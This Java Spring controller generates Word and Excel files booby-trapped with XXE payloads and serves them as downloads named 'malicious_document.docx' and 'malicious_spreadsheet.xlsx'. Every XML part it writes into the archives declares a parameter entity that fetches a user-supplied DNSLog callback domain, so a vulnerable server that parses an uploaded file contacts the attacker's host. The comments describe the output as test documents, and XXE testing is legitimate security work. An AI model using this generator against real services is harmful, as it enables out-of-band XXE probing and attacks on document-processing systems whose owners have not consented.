package com.xxe.demo;

import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;

import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * POC生成器控制器
 * 用于生成包含XXE漏洞的测试文档
 */
@Controller
public class PocGeneratorController {

    /**
     * 显示POC生成页面
     */
    @GetMapping("/generate-poc")
    public String showGeneratePage() {
        return "index"; // 假设你有一个名为 index.html 的页面
    }

    /**
     * 生成自定义DNSLog的恶意文档
     */
    @PostMapping("/generate-poc")
    public ResponseEntity<byte[]> generatePoc(
            @RequestParam String dnslogDomain,
            @RequestParam String fileType) throws IOException {

        // 验证输入
        if (dnslogDomain == null || dnslogDomain.trim().isEmpty()) {
            return ResponseEntity.badRequest().body("DNSLog域名不能为空".getBytes(StandardCharsets.UTF_8));
        }

        byte[] fileContent;
        String fileName;
        MediaType mediaType;

        // 根据文件类型生成对应的恶意文档
        if ("docx".equalsIgnoreCase(fileType)) {
            fileContent = generateMaliciousWord(dnslogDomain);
            fileName = "malicious_document.docx";
            mediaType = MediaType.APPLICATION_OCTET_STREAM;
        } else if ("xlsx".equalsIgnoreCase(fileType)) {
            fileContent = generateMaliciousExcel(dnslogDomain);
            fileName = "malicious_spreadsheet.xlsx";
            mediaType = MediaType.APPLICATION_OCTET_STREAM;
        } else {
            return ResponseEntity.badRequest().body("不支持的文件类型".getBytes(StandardCharsets.UTF_8));
        }

        // 设置响应头
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(mediaType);
        headers.setContentDispositionFormData("attachment", fileName);
        headers.setContentLength(fileContent.length);

        return ResponseEntity.ok()
                .headers(headers)
                .body(fileContent);
    }

    /**
     * 生成包含XXE漏洞的Word文档
     */
    private byte[] generateMaliciousWord(String dnslogDomain) throws IOException {
        // 对于Word文档(.docx)，我们需要创建一个包含XXE payload的ZIP文件结构
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ZipOutputStream zos = new ZipOutputStream(baos);

        // 创建[Content_Types].xml - 在这里注入XXE payload (参数实体)
        zos.putNextEntry(new ZipEntry("[Content_Types].xml"));
        String xxePayloadContentTypes = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                "<!DOCTYPE Types [ " +
                "<!ENTITY % xxe SYSTEM \"" + dnslogDomain + "\" > " + // 参数实体
                "%xxe; " + // 引用参数实体
                "]>" +
                "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\n" +
                "  <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\n" +
                "  <Default Extension=\"xml\" ContentType=\"application/xml\"/>\n" +
                "  <Override PartName=\"/word/document.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml\"/>\n" +
                "</Types>";
        zos.write(xxePayloadContentTypes.getBytes(StandardCharsets.UTF_8));
        zos.closeEntry();

        // 创建_rels/.rels文件 - 在这里注入XXE payload (参数实体)
        zos.putNextEntry(new ZipEntry("_rels/.rels"));
        String xxePayloadRootRels = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                "<!DOCTYPE foo [ " +
                "<!ENTITY % xxe SYSTEM \"" + dnslogDomain + "\" > " + // 参数实体
                "%xxe; " + // 引用参数实体
                "]>" +
                "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n" +
                "  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"word/document.xml\"/>\n" +
                "</Relationships>";
        zos.write(xxePayloadRootRels.getBytes(StandardCharsets.UTF_8));
        zos.closeEntry();

        // 创建word/_rels/document.xml.rels (如果需要定义文档内部关系，通常为空或无特殊关系时可选)
        zos.putNextEntry(new ZipEntry("word/_rels/document.xml.rels"));
        String xxePayloadDocRels = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                "<!DOCTYPE foo [ " +
                "<!ENTITY % xxe SYSTEM \"" + dnslogDomain + "\" > " + // 参数实体
                "%xxe; " + // 引用参数实体
                "]>" +
                "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"/>";
        zos.write(xxePayloadDocRels.getBytes(StandardCharsets.UTF_8));
        zos.closeEntry();

        // 创建word/document.xml - 在这里注入XXE payload (参数实体)
        zos.putNextEntry(new ZipEntry("word/document.xml"));
        // XXE Payload: 在DOCTYPE中定义实体，然后在文档内容中引用它或直接引用参数实体
        String xxePayloadDoc = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<!DOCTYPE foo [ " +
                "<!ENTITY % xxe SYSTEM \"" + dnslogDomain + "\" > " + // 参数实体
                "%xxe; " + // 引用参数实体
                "]>" +
                "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">" +
                "  <w:body>" +
                "    <w:p>" +
                "      <w:r>" +
                "        <w:t>XXE漏洞测试文档 - DNSLog: " + dnslogDomain + "</w:t>" + // 文本内容
                "      </w:r>" +
                "    </w:p>" +
                "  </w:body>" +
                "</w:document>";
        zos.write(xxePayloadDoc.getBytes(StandardCharsets.UTF_8));
        zos.closeEntry();

        zos.close();
        return baos.toByteArray();
    }

    /**
     * 生成包含XXE漏洞的Excel文档
     */
    private byte[] generateMaliciousExcel(String dnslogDomain) throws IOException {
        // 对于Excel文档(.xlsx)，我们需要创建一个包含XXE payload的ZIP文件结构
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ZipOutputStream zos = new ZipOutputStream(baos);

        // 创建[Content_Types].xml - 在这里注入XXE payload (参数实体)
        zos.putNextEntry(new ZipEntry("[Content_Types].xml"));
        String xxePayloadContentTypes = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                "<!DOCTYPE Types [ " +
                "<!ENTITY % xxe SYSTEM \"" + dnslogDomain + "\" > " + // 参数实体
                "%xxe; " + // 引用参数实体
                "]>" +
                "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\n" +
                "  <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\n" +
                "  <Default Extension=\"xml\" ContentType=\"application/xml\"/>\n" +
                "  <Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml\"/>\n" +
                "  <Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/>\n" +
                "  <Override PartName=\"/xl/sharedStrings.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml\"/>\n" + // 添加 sharedStrings 类型
                "</Types>";
        zos.write(xxePayloadContentTypes.getBytes(StandardCharsets.UTF_8));
        zos.closeEntry();

        // 创建_rels/.rels文件 - 根关系文件，注入XXE payload (参数实体)
        zos.putNextEntry(new ZipEntry("_rels/.rels"));
        String xxePayloadRootRels = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                "<!DOCTYPE foo [ " +
                "<!ENTITY % xxe SYSTEM \"" + dnslogDomain + "\" > " + // 参数实体
                "%xxe; " + // 引用参数实体
                "]>" +
                "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n" +
                "  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/>\n" +
                "</Relationships>";
        zos.write(xxePayloadRootRels.getBytes(StandardCharsets.UTF_8));
        zos.closeEntry();

        // 创建xl/_rels/workbook.xml.rels，注入XXE payload (参数实体)
        zos.putNextEntry(new ZipEntry("xl/_rels/workbook.xml.rels"));
        String xxePayloadWorkbookRels = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                "<!DOCTYPE foo [ " +
                "<!ENTITY % xxe SYSTEM \"" + dnslogDomain + "\" > " + // 参数实体
                "%xxe; " + // 引用参数实体
                "]>" +
                "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n" +
                "  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>\n" +
                "  <Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings\" Target=\"sharedStrings.xml\"/>\n" + // 添加 sharedStrings 关系
                "</Relationships>";
        zos.write(xxePayloadWorkbookRels.getBytes(StandardCharsets.UTF_8));
        zos.closeEntry();

        // 创建xl/workbook.xml，注入XXE payload (参数实体)
        zos.putNextEntry(new ZipEntry("xl/workbook.xml"));
        String xxePayloadWorkbook = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                "<!DOCTYPE workbook [ " +
                "<!ENTITY % xxe SYSTEM \"" + dnslogDomain + "\" > " + // 参数实体
                "%xxe; " + // 引用参数实体
                "]>" +
                "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">\n" +
                "  <sheets>\n" +
                "    <sheet name=\"XXE测试\" sheetId=\"1\" r:id=\"rId1\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"/>\n" +
                "  </sheets>\n" +
                "</workbook>";
        zos.write(xxePayloadWorkbook.getBytes(StandardCharsets.UTF_8));
        zos.closeEntry();

        // 创建xl/worksheets/sheet1.xml，注入XXE payload (参数实体)
        zos.putNextEntry(new ZipEntry("xl/worksheets/sheet1.xml"));
        String xxePayloadSheet = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                "<!DOCTYPE worksheet [ " +
                "<!ENTITY % xxe SYSTEM \"" + dnslogDomain + "\" > " + // 参数实体
                "%xxe; " + // 引用参数实体
                "]>" +
                "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">\n" +
                "  <sheetData>\n" +
                "    <row r=\"1\">\n" +
                "      <c r=\"A1\" t=\"s\"><v>0</v></c> <!-- 引用 sharedStrings.xml 中索引为 0 的字符串 -->\n" +
                "    </row>\n" +
                "  </sheetData>\n" +
                "</worksheet>";
        zos.write(xxePayloadSheet.getBytes(StandardCharsets.UTF_8));
        zos.closeEntry();

        // 创建xl/sharedStrings.xml - 在这里注入XXE payload (参数实体)
        zos.putNextEntry(new ZipEntry("xl/sharedStrings.xml"));
        String xxePayloadSharedStrings = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<!DOCTYPE sst [ " +
                "<!ENTITY % xxe SYSTEM \"" + dnslogDomain + "\" > " + // 参数实体
                "%xxe; " + // 引用参数实体
                "]>" +
                "<sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"1\" uniqueCount=\"1\">\n" +
                "  <si><t>Shared String Content</t></si> <!-- 示例内容 -->\n" +
                "</sst>";
        zos.write(xxePayloadSharedStrings.getBytes(StandardCharsets.UTF_8));
        zos.closeEntry();

        zos.close();
        return baos.toByteArray();
    }
}